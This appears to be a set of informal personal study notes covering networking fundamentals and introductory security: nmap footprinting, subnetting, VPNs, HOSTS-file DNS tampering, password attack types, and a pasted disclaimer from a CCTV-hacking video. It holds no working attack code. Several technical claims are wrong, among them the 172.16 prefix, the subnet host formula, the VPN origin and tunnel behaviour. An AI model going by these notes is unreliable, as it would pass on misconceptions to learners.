==========================================Networking & security==========================================
>>>There is always a trade of between security and functionality of the system...and decided by how much do we need each one of them

>>>The CIA traid - fundamental security principle
C - confedentially - only to authorized people
I - integrity - maintained by hashing/encryption, auditing
A - availability - availability to authorized user when they need it
protecting the C, I and A of data & services

>>>Authentication(+vely identified user...ex.username/password) v/s Authorization(allow to perform action after authenticated...implemented
using rights, priviledges, permissions,etc)

>>>Attack vectors
1.Network-based
2.Host-based
DOS(Denial Of Service) attacks attempts to deny the use of computer systems and their data from their authorized user...DOS are for 
data corruption or for damaging the computer system 

>>Defense concepts --> "Defence in depth" startegy is the best..it's about defending the every component of network or system and it covers
every part of system or network
Three types of controls are involved
1.Administrative control - defined by mgmt
2.Technical or logical controls - firewalls, Intrusion detection systems,etc
3.Physical controls

Threat uses the vulnerabilities to diminish the system security and expose it...exposure is the vilneability that has been exploited
Mitigations

>>Security patches

>>Footprinting -> info gathering
types
1.open source/passive info gathering
2.active info gathering
3.Anonymous footprinting
4.pseudonymous footprinting

after DNS info you should gather the network related info...

10.0.0.0-10.255.255.255 (10/8 prefix) - for private network
172.16.0.0-172.31.255.255 (172.16/8 prefix)
192.168.0.0-192.168.255.255 (192.168/16 prefix)

OS footprinting - nmap
open ports will give you bunch of info

>>nmap/zenmap -- basically to gather the info...Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, 
what services (application name and version) those hosts are offering, 
what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.
-need to careful while doing the intense scans...coz system administrator can easily know

port forwarding...of the routers...advantages vs disadvantages

=============================================Basics of networking=============================================
1.modem is ur first device which connects to the internet/cloud (cloud is internet only)...then comes the router...then comes the firewall...then comes switches...then lastly your computer

2.Physical vs logical connectivity of machines - two comp which seems connected to the same switch via cable may not be able to connected to each other...coz logically they may be on the different network (as in switch can split them)

3.Router - separates the internet connection i.e. fom modem...it will go to different routers

4.VPN - as name suggest it's virtual private network...somebody sitting in US can connect to our inranet of office in india...i.e. to your private network
we have VPN end point (a logical web server which can give access to person in US via username and password)

5.Hub is dumb but switch is little intelligent...a switch can be programmed\

6.Wireless standards

7.now a days systems sometimes we call "router"...is not just a router...it's a firewall..VPN end point...Wireless access poinr(WAP), etc...all logical connections in one physical device

8.Generally speed we talk in terms of "bits/sec"...and size in "bytes"

9.IP addresses - static vs dynamic - static is always better than dynamic
generally port for some services are fixed...ex HTTP - 80,etc

10.Sync means both up/down speed are same and async means up/down speeds are different

11.point to point wireless -- direction specific...point the direction of antennas towards each other...and different from wireless/wifi

12.DSL

13.Demarc point, MDFs and IDFs, DMZ

14.OSI model

15.The HUB is basically like a spliter...ex. we have kinda hub in our house for TV...main connection comes and we split that connection and give it to the 4 different TVs...whatever comes from the main connection or if one of the device trying to send the signal to one particular device...it will send that to all the devices connected to the hub which leads to the bandwidth wastage...in hub only one device can communicate...otherwise there will be collison...but in case of SWITCH...it can intelligently understand where a particular device is and will "only" send the data to that device...using MAC addresses it knows where the device is. 

Managed (we can set the configs)vs Unmanaged switches

16.VLAN - we need routers to connect two different VLANs...A VLAN cannot be used to connect two diiferent VLANs

17.QOS/COS (quality/class of service) - it will decide the priority for the communications like VoIP is at highest, then live video streaming...then file downloadings,etc

18.Spaaning tree protocol - for switches
Network loops - same cable's two ends in different ports will create a network loop...consumes processing power and leads to network shutdown...standard switches like cisco prevents such loops automatically if it finds one.

19.SOHO routers- small office home office routers

20.DHCP - DHCP servers and DHCP addresses
basically assigns IP addresses to the client computers on the network

21.DNS - turns the name into IP address

22.firewall - it just blocks the PORTS

23.port triggering - avoid

24.DMZ

25.powerline networking 

26.Access point receives and broadcasts to wide range...and bridge can talk to only one particular wireless access point

27.power over ethernet

28.Network mapping
learn all the protocols...TCP/IP, ICMP(port scanning..."ping"), SNMP(to gather the system info & resources),etc.

default gateway - ip of a router i.e the ip which takes you out of your building
traceroute  -->  tracert() --> all the routers you encouter while reaching a particular server
ping --> for all the networking devices which use TCP/IP

Default gateway/DHCP server and DNS server can have same address (if the network is simple) or can be different

====Network mapping tools=====
1.portScane
2.spiceworks - zeher hai ekdam

We can turn off the ping request

====================TCP/IP protocol(along with some other protocol)====================
IP - deals with all the types of ip addresses 
Once IP discovers computer using ip addresses...TCP comes in picture and decides how they will talk..."windowing " 

Subnet masking - we can avoid the communication between all the systems on network

when we search for something...it first looks in local network(for that IP address {DNS converts domain name to ip}) and if not found...it goes out via default gatewy into the internet

DHCP - allocates the all types of IP addresses
we have to configure the DHCP

NAT (network addresss translation...external address to local netrwork)
coz of NAT two devices can have same IP...else we would be required unique address for each device which is never possible

=====================Subnet masking=======================
192.168.1.1  -  network identifier + device identifier --> this two we will know from subnet mask
depending on how many networks we need and how many devices we need on network...we can decide the IPv4 and subnet mask

_ _ _ _ _ _ _ _. _ _ _ _ _ _ _. _ _ _ _ _ _ _. _ _ _ _ _ _ _  --> fist n bits for no of networks and remaining all 16-n or how many u want will be for hosts
2^n = # of networks   ====== [(2^n) - 2] = # of hosts
if we choose first 8 bits for subnet -> 11111111.00000000.00000000.00000000 == 255.0.0.0 = subnmet mask
A class subnet mask - 255.0.0.0
B class subnet mask - 255.255.0.0
C class subnet mask - 255.255.255.0 --> (2^8 - 2) = 254 hosts

if two devices are on two different TCP/IP subnets --> they cannnot talk...we need router for that

SERVER Operating systems are very fast, robust and can handle number of user requests than normal operating systems
 
Authentication[in windows] --> Active Directory -- gives access key

_____________________________VPN (client server architecture)_____________________________
To connect the two networks securely
why VPN invented?  --> for military purpose...even the in between offices blows off during the war...St.A & St.B can still communicate...so St.A and St.B can use another route automatically

A MAN IN THE MIDDLE ATTACK

Tunneling protocol - creates a tunnel(data tube) between St.A & St.B....and the data is encrypted too
and this tunnel is smart...if it finds someone hacking...it will create a new route for it.

VPN server needs credential to connect.VPN connection keeps dropping the tunnel and keep making new one may be because of fucked up wiring...and may not be always hacker attack...coz old wiring drops packets

_____________________________________VoIP__________________________________________
it's what is means...voice over IP...voice over internet
IP trunks
VoIP servers
VoIP gateways connects the normal telephone lines and VoIP networks
Normal telephone/mobile call latency = ~45ms  v/s  VoIP latency = 75-100ms

================Hacking DNS========================
HOSTS file --> Local DNS --> public DNS...if mapping is not found in the HOSTS file it goes to local DNS --> if not it goes to public DNS
HOSTS file in the ___C:\Windows\System32\drivers\etc___ can be modified to wrongly map the DNS
HOSTS is particular to that PCs wrong mapping
Local DNS will lead to the problems for all the PCs on that local network
Public DNS will lead to the problems for all the PCs on the internet

>>>Advanced persistent threat(APT)...get into the target undetected

Obtaining the password
1.active online attacks
dictionary, brute force, keylogger attack
2.passive online attack
packet sniffing, MITM(man in the middle),reply attack
3.offline evaluation
rainbow attacks - ranbow tables - contains hash values for possibility

Famous hashing algo
1.SHA (secure hash algorithm)  
2.MD5 (message digest)

============================CCTV camera============================
This video is about hacking a CCTV camera, IP camera within your network and also the cams which are around the world
This video is only for education purpose . Aim of this video is to show how poor the security is and it can be easily exploited by anyone with basic computer knowledge .
CCTV cameras should use strong passwords. Do not use it against the law. I am not responsible for the troubles you get in.
